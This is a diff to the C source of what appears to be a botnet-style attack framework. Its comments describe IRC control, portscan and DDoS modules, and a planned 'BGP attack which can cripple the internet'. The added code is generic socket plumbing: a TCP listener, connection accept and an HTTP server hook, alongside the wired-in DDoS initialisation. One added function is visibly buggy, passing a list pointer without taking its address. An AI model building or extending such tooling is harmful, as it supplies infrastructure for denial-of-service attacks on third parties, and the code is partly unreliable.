@@ -1,5 +1,13 @@
 /*
 
+the majority of this system is event driver based around sockets, and timers
+for keeping things cozy with p2p protocols, etc..
+
+its fairly simple to add new protocols, etc.. you can look at some of the
+modules already developed and add another quickly
+
+-----
+
 in a later release + the version that goes live this weekend ill encapsulate some documents which explains why im writing scripting
 
 ill also attach a BGP attack which can cripple the internet.. i hope it works :) ill leave source for everything
@@ -80,6 +88,7 @@ so nodes can use several communication methods, and irc can be used to control
 #include <time.h>
 #include <string.h>
 #include <arpa/inet.h>
+#include <fcntl.h>
 #include "structs.h"
 #include "list.h"
 #include "utils.h"
@@ -99,6 +108,8 @@ so nodes can use several communication methods, and irc can be used to control
 #include "modules/portscan/portscan.h"
 // DoS/DDoS module
 #include "modules/dos/attacks.h"
+// http web servers
+#include "modules/httpd/httpd.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 #define MIN(a, b) ((a) < (b) ? ( a) : (b))
@@ -316,8 +327,17 @@ void socket_loop(Modules *modules) {
             // the module may have several Connection as well
             for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
                 printf("cnnection under module %p: %d\n", mptr, modcptr->fd);
-                if (FD_ISSET(modcptr->fd, &readfds))
-                    ConnectionRead(modcptr);
+                
+                if (FD_ISSET(modcptr->fd, &readfds)) {
+                    if (modcptr->state == TCP_LISTEN) {
+                        // if its listening... its a new connection..
+                        // it needs to adopt to its correct module after
+                        // accepting
+                        ConnectionNew(modcptr);
+                    } else {
+                        ConnectionRead(modcptr);
+                    }
+                }
                     
                 if (FD_ISSET(modcptr->fd,&writefds))
                     OutgoingFlush(modcptr);
@@ -648,6 +668,53 @@ int Module_Add(Modules **_module_list, Modules *newmodule) {
     newmodule->start_ts = time(0);
 }
 
+
+// listen on a tcp port
+Connection *tcp_listen(Modules *mptr, int port) {
+    int fd = 0;
+    Connection *ret = NULL;
+    int r = 0;
+    int sock_opt = 0;
+        
+    struct sockaddr_in dst;
+    dst.sin_addr.s_addr = inet_addr("0.0.0.0");
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(port);
+    
+    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+        // ret = NULL..
+        return ret;
+    }
+    
+    // set non blocking I/O for socket..
+    sock_opt = fcntl(fd, F_GETFL, 0);
+    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);
+    
+    if (bind(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in)) == -1) {
+        close(fd);
+        return NULL;
+    }
+    
+    // max of 5 backlog..? should be fine..
+    listen(fd, 5);
+    
+    ret = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
+    if (ret == NULL) {
+        close(fd);
+        return ret;
+    }
+    
+    ret->fd = fd;
+    ret->port = port;
+    
+    ret->module = mptr;
+    ret->list = &mptr->connections;
+    ret->addr = dst.sin_addr.s_addr;
+    ret->state = TCP_LISTEN;
+    
+    return ret;
+}
+
 // socket connection outgoing for p2p framework
 // -1 = error allocating, 0 = cannot connect
 // 1 = non blocking processing or connected
@@ -656,6 +723,7 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     int fd = 0;
     int r = 0;
     Connection *cptr = NULL;
+    int sock_opt = 0;
     
     // let operating system know what type of socket/connection/parameters in this structure
     struct sockaddr_in dst;
@@ -667,6 +735,10 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
         return ret;
 
+    // set non blocking I/O for socket..
+    sock_opt = fcntl(fd, F_GETFL, 0);
+    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);
+   
 
     printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);
 
@@ -712,6 +784,35 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     return ret;
 }
 
+// accepts new connections from a listen socket
+void ConnectionNew(Connection *cptr) {
+    Connection *conn = NULL;
+    int sockfd = 0;
+    struct sockaddr_in src;
+    socklen_t socklen = sizeof(struct sockaddr_in);
+    
+    // if we cannot accept it for some reason...
+    if ((sockfd = accept(cptr->fd,(struct sockaddr *) &src, &socklen)) <= 0) {
+        return;
+    }
+    
+    // create a new connection structure to hold it under the appropriate module
+    conn = (Connection *)L_add((LIST **)cptr->module->connections, sizeof(Connection));
+    if (conn == NULL) {
+        close(sockfd);
+        return;
+    }
+    
+    // setup appropriate configuration for the new connection
+    conn->fd = sockfd;
+    conn->ip = src.sin_addr.s_addr;
+    conn->port = src.sin_port;
+    conn->module = cptr->module;
+    conn->list = cptr->list;
+    conn->state = TCP_CONNECTED;
+
+    return;        
+}
 
 // we will use a simple main in the beginning...
 // i want this to be a library, or a very simple node
@@ -728,6 +829,8 @@ int main(int argc, char *argv[]) {
     telnet_init(&module_list);
     // initialize module for (D)DoS
     attack_init(&module_list);
+    // http servers
+    httpd_init(&module_list);
     
     // main loop
     while (1) {
